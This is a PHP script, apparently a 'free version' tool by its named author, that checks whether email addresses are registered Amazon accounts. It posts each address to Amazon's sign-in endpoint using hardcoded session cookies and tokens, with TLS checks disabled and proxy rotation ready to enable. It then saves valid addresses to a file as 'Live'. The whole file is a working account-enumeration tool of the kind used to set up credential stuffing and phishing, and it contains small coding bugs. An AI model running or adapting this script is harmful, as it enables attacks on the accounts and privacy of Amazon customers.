<?php
/////////////////////Coded BY Perioth @perioth /////////////////////////////
//////Version 0.1/////// unchecked emails are saved to unchecked.txtwhich u may need to recehck if proxies fail //////////////
//////Valid are saved to email.txt//////////////////////////////////////////////////
//////////////////////And unregistered are saved to unregistered.txt///////////////////////////////
/////////Free Version//////////////////////////////////////


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');


$lista = $_GET['lista'];
$list = explode('|', $lista);
$email = $list[0];

function saveEMAIL($email) {
    $file = dirname(__FILE__) . "/email.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $email . PHP_EOL);
    fclose($fp);
}
function saveEMAILR($emailr) {
    $file = dirname(__FILE__) . "/unregemail.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $emailr . PHP_EOL);
    fclose($fp);
}
function saveEMAILA($emaila) {
    $file = dirname(__FILE__) . "/uncheckedemail.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $email . PHP_EOL);
    fclose($fp);
}

// functions
function strposa($haystack, $needles = [], $offset = 0)
{
    $chr = [];
    foreach ($needles as $needle) {
        $res = strpos($haystack, $needle, $offset);
        if ($res !== false) {
            $chr[$needle] = $res;
        }
    }
    if (empty($chr)) {
        return false;
    }
    return min($chr);
}
function getStr2($string, $start, $end) 
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}



$ch = curl_init();
//$post ='appActionToken=A0lhj2FjiiIzO5LtuV7n10SYBcj2Bmkj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS9yZWY9Z3dfc2duX2li&prevRID=ape%3AN0dZNDY3WEE4Q0gwUFNYWllNQTk%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.Mt1V2HyArejSmDleJMaU9xD-3kaZAHwMdaoF1Wn6KZFyqPmLXayVvQ.KNq_C7k7_BWbcedR.SFVaO4Tyzg8qlxLDfMGcC_dRR2y1iqIlNA7GlMdyXKd5pib4dkmgGqy5A7C5GuB9gwN2zVFe8eGjk3CuimFIupS3HJx5djN_jBXD8WipCsw9Qf7St538gkMoumDEMTpCT4rZ_uue4HZ0bPuFHVeEVzSWazTJPhCiQjaRSNo9oEjQO3Q5eJnZ6kkNd-A4zeRm9D5ljJ--mNyO9tJp4MvyIDzoF218JQwrBzmnikkFmj0tLL1vYO1klt3tsxBXgG99aeAHDOUHBxVogjyph07IcQ.GXkHLBkn8_j2PYx9RuCeGw&email='.$email.'&password=&create=0&metadata1=ECdITeCs%3AXwfASwkpOreNKwSEH5d7YRpQx23pSOSxjmWsbF%2FXsQYYeCfbMRuz61dNoY%2FHXszj0wGKvxF2fxf%2BLSGPRjXAFUC9%2BTWXy2eRBChBEL8%2F0EtBy1Sv8UKLYUkIfua8v4CUX6b7ksniCeHayu%2B1zy9nQIb3%2FtCcwXdpSDDmg9r1vKNUS%2BIFUo%2BfyoifXDG%2Bt9QHWXWAF%2BnS6bIrmjjw%2BQ3eF%2BHsewJm8HlJ7HN0KX6gk3GQbEYlVUtNkq5uMkRV0JXliHxbg0uqbyzTrIcyX%2FbLnIXKk%2Fp5y3Fq8LNymc6Y2b5MuGtW2m%2FBeyluNg%2FAte9t6WyyjoPyi%2F2m61UA5Hd%2Bc7o9gggx0WyA7HFLrvac6lpRXiaCzUJlVzIPhntZLlPIny0HkbdN6y2KCixpJPTuCtxBe2afLvk3JAlXGEjAGRUnIyGV1U%2FixS1AuzPtULVQnxi6MG%2Fmhm2gGJdVsfGNaXOSUvw%2BoiND3fW%2FcFakSwGBmMw6cYtc5LlI3RQTZhwXeUx%2FTJUXtno0KXwU5CHr7MaeVU%2FNplRSxx%2B%2FsPf2wFEz%2BCVlSQp0Ff7U1z%2Fp7i9aUeklwvDwdmsldU5fY5xj6Ai0AxI4Q1Z96J3bpEri%2BoEpmNsK6AfFLupjJ4ECLLw89z1bNb7sy72ThDSTLTXs2qIh61%2FTlv2WYhlQM%2FCSL21yt7gb26p15wvaeClLvK9OzGRa%2FhresWCWsWvq7NDNF%2BeRhA%2FLlplFDc45QaBsM3n%2FnC1nCL9pVLsXbMtP94cpZwkQr4vq8PQg6UUjmM1Fv8UKXLLbIvo5v%2BGMrBPNp3loR33ruqiLg7SnwYxMbmZNLlHRS66YkI%2BwVfUcR5jKgc3EtYXUcFLhlsnGcF9lc0lZL%2BxWIyjdwRLBkF53yE78KfOVxxp2PV6lBQIiR1kLtS%2FxLdAETMDlBQqTsB0u8wDke3RBTRj2enCCAqJCVi04G67hiZe%2F%2BhOczS7b8w6be6x1S4p7ArlyUIv1TH%2BzBkqURClTyJSC9Y13%2Blsa5iaN7JWChJip5ChIO7HWNLI8vzpaJ3N4R9aeJ3rbo5Mr3Y%2FxE4A2aDAGLVeOchMMw%2FAvjCNnyWrprmXLVXzSaolCryqrDFxDc7t9UEVvl25kWFyI9A6%2FeB0Zm8XQPqjc3QY1lEqXzUlV%2FmjkO%2BArwqC%2BkyyOy5vusenVeXT7WSK1%2BRC2QJdNP77gXw%3D%3D';
$post ='appActionToken=wWj2BOciDvI3IWJWRWV3dj2Flixen6sj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC95b3Vyc3RvcmUvY2FyZD9pZT1VVEY4JnJlZl89Y3VzdF9yZWNfaW50ZXN0aXRpYWxfc2lnbmlu&prevRID=ape%3ATVpEWlE4MkNIQTFKN0ZGNlYxNFc%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.wV_VIDLHe6_2ILMCQK-udiC8GJs5-sak8dMs2avuvbLRGXDja-j4ww.UJrKrhbq--Hw_p3e.FqfCQbBDQI0EUKwmSTwWQlaA0wUmCRmE9cZvBFCXpUJO6E4y3M3s43zSz3dY9XkNtu6EC0QzVtyI0E04pLmRE7A8YPCxWCIx6D_WWlXQdtRNI4bFHgNoeiLGtekYYN53j8NJfiqM_eBAQbqLzX3scVfq8KOOQkwRLi151xzYrfprEbrM9ldJldOsCETjtHkO1MyJyPRpU1xG_hpjFkfEJuhOsNm4YzhUhQmkxnFUN7V0aydDTj5mRlMGABDwNRI2-dWoJl6js_P5NRDlRHSlTVDIOpbyV1x8zfmcQdkbNSG2oJoV8RfL0B6J5DwaAn2Jwziv3eg5QSyeGHKUys9ZBN0gux-oFUc.epKr0S75DtvkQfSxj_k7-g&email=%2B'.$email.'&password=&create=0&metadata1=ECdITeCs%3Au%2FXUI%2BC8oY99k9wkxq6UyBZqM6QJJOcOXF4qU2L0YQ17CX7VNb5UzJ%2FkzrAbQIT4zQA%2FK%2BGVGL6l2h1CJrAAvg9VOLSMfxFKhsySWb0YKFdg7GqCqBHhviG%2BxSgYrKV%2FFRV1vQpuU8%2F%2B12KmuVFC91nRl3SU97B2aNSBDAsRmtvw4reGbnbZEpCXjndUnsTR8Q6HgyKdOrMm1IobO7OHuW3F2mFnMUczoT8L181Ule9SrsGmu5Br9jo97dVRFUC64wb7Jz7eLRUfnkfjsn2R9JhZLoBVaGX3njthUvb9w11d84IMvuRqqCHMFWhV1v1kQMe9hqqF8EkRN4o9P34fxA5ywUSoedTH95kUXnO%2FzhFtRhbiY51s8s8%2FIuB7WZmSyJjOHFaw%2FcbyM7n2SPmMHNuL5vjniPPfyQ4UxIp7zKbTfmV8kIQNg59%2BdYsyq8Y40iROzJO6PPoeel%2BFMBsmUdJj6gkY4nmmrtWpsO7nx%2FiLlY27NNxfVuMq5tzUOYtwkI75S2J%2B3FifNlrZr9hIRJvsVSzfK55KsX8mEZofRUzC9WA1e%2BEXqtBqpAH7dDY97omB5UwehdwSsdG847lb5We3mfXBIkB9gDWyc44uJrXWeS3OMmpJddZfOQ%2BGBox9VkhTccrlVQs4x0IVaRNkrFQnI5DTZ8op4K5HlSRl9ZKOm9%2FHl5%2FPcc2CIsf3p0YV9C5oE4G2uUg49%2F4k0%2FcAcavMduYevCg3v2XlghqooCwMTdutXylS3h%2FFxIBn1ir%2FJYEfJGS9MGeOPms0TgRflCH%2BLmEqR8jY%2BlkDwQ0DmxVNth3y2h%2Bf0N6zl68YLaTwbsDyyZKrgvWEjBPdbx60gzaL8Fvujp4kCw1xNyWMSvFuFuOcCLEHQMKzu2AoVxFBHBOqe2prqK4TPC4F0EOrN4YwjUPgRYwtMQzuZC2b%2BJGVV3d5HDIcPoAtx6lMAmtXHlevA2XyrElqlfgyeqq%2FtgBvvjfoMuz71UZhixhMLthEsdbqz4387UVUdMselwf3ss%2FRgrsGotwAylCOz1MMklfFeC7m0pbONqKrkkVNYsOTjm73%2BDgODfsL6T6ZhJNBbuHKxh7zA%2FMpfHVuKEZ7ghknJDPgFnIBNk6%2FgBSmac4nRpxeO7EQJs8JMWkQ%2BcCa5JyhtacG%2FiTXFJGAA2PgWP8WV93uclD%2BEriJMYOi7ZAx%2BVQxgLmUvk1OkJtM4a2j4Gv5s6U2DdgjsCVSUrkrljkZKyuZSIzq3vnUzB1gm35hPjfLK6t2C0Uz9cv0%2FsTLVw0VGXcqNg53IICLMt3%2FWstJ7TWNxgc5J1KvST07H%2F1OAHHPySQ0O88QENSqv1P584YihAzW86wi11ZK0t1e0x1QJYe9fVVCPuPGErOEUpadDDsLtEHz9I1TRAt4S6qdgf8GMpn%2FQThIY6Jbr%2BZ5rM0G15ft9MhhVWlYaoLAcqu%2FGddnYApYqyAW8DcQBFaUM7yvysxHPk6RPqhuWSo%2BTnMvSmPLFWgTRtOeOJVmLPR8g%2B9d7mSDNL5hvg4kkDbZrqS6nTh59RxWECY4%2Fz3%2F%2BHGPD0bfjQuCrVnHBPuipT%2F57aVlY7r%2FzjEuCmC4FO7u3pLwRse7YfaDpm7l1%2FHkSUQxAxz8Gk%2BU7Pfni0XP9d2k6YJ4RxTV0%2BXcQ8vn9M6InZL2tulnto1bqti55Jx3oRiXwHVQHMllW9sroZCAXUL1POHfumx00U9qyDS%2FkH5wWTgoJMhJrwnOJYPR%2BuI1C7Yq%2B3sgCf72dfSGEL8rxEOWbLP7ahPmIJRSt3B560nEamr6WRoN5ulV6YT13XK4QMtfSVqthsmFVf7O40SEVuQ%3D';
$array = [
    CURLOPT_URL => 'https://www.amazon.com/ap/signin',
    CURLOPT_RETURNTRANSFER => 1,

  //CURLOPT_PROXY => 'gate.smartproxy.com:7000',
  ///CURLOPT_PROXYUSERPWD => ''.$username.':'.$password.'',

    CURLOPT_HEADER => 0,
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => $post,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_RETURNTRANSFER => 1,

    CURLOPT_HTTPHEADER => [
     
     
        'content-type: application/x-www-form-urlencoded',
		//'cookie: session-id=142-1944702-0213763; ubid-main=132-5083352-0000157; session-token=yiuTjHJy+Ku3kGz0riDGQZ+VDf5/Z8sufGFwYryo2wQf2Dg/kwWebN8M98be3NRV3I0xqwXXutpgWe3nQ1BSh7dEuAS69mvh3BHElgOMqsDf3qqzgQceO4RR3IZkJkZhVGbJrIW+KDoB+qh2RgQsZJZwHZ3/4lC2w9tclatYGV2MYL0laxOANOfe0H07UOaFyK9KCYWkuGMLY2f5JoD1D+3dFMC37zpO; i18n-prefs=USD; sp-cdn="L5Z9:GB"; skin=noskin; session-id-time=2231666633l; csm-hit=tb:6V8KGEJRN6JX71JKRHG6+s-7GY467XA8CH0PSXZYMA9|1600946635368&t:1600946635368&adb:adblk_no',
'cookie: session-id=140-0173671-8361809; ubid-main=133-0641990-4410917; i18n-prefs=USD; sp-cdn="L5Z9:NP"; skin=noskin; session-token=us+HWYVeCfehiaI4fVV6hhzYRb6261/nkSNX2O97cl70kQQuIlq/PxngjIpZApJzAM5yUBRQQBXAeGXWcLRuBntzKfMuRanzQJgFcgivgSYaos8H6MOFIYFFUV79HI9IYTf6PlFJ/A8nmxFyPTrle5Wyiv/8VGUNmEvbXSKZzX6ETqLKMWizw+JROrwjjEJ4; session-id-time=2228223125l; csm-hit=tb:JKHV95A1YGGJJVT4VVK5+s-MZDZQ82CHA1J7FF6V14W|1597503133006&t:1597503133006&adb:adblk_no',
        'origin: https://www.amazon.com',
'referer: https://www.amazon.com/ap/signin?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=usflex&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fcard%3Fie%3DUTF8%26ref_%3Dcust_rec_intestitial_signin&prevRID=DXVVE1DRNF3EH8BCRHQY&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&prepopulatedLoginId=eyJjaXBoZXIiOiI2cDgxdEtqNlQvL2VicVBrWlYyYTdnPT0iLCJJViI6IjhybmswM0k1d0VSNHYzT3lQdU1uUlE9PSIsInZlcnNpb24iOjF9&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&timestamp=1597502967000'
    ]
];
curl_setopt_array($ch, $array);
$result = curl_exec($ch);
$type = trim(strip_tags(getStr2($result,'"line_type":"','"')));

if (strpos($result, 'id="auth-signin-button"')){
    saveEMAIL("$email");
echo "<font size=2 color='white'><font class='badge badge-success'>Live Valid ›</i></font>$email <font size=2 color='white'><font class='badge badge-success'> Valid  </i></font><br>";
}

elseif (strpos($result, 'We cannot find an account with that mobile number')){
        saveEMAILA("$email $result");
 echo "<font size=2 color='white'><font class='badge badge-danger'>Dead Inavlid </i></font> $email <font size=2 color='red'><font class='badge badge-danger'> Invalid</i></font><br>";
}
else{
    saveEMAILA("$email [$result]");
echo "<font size=2 color='white'><font class='badge badge-danger'>Dead Inavlid </i></font> $email <font size=2 color='red'><font class='badge badge-danger'> $result </i></font><br>";
}


?>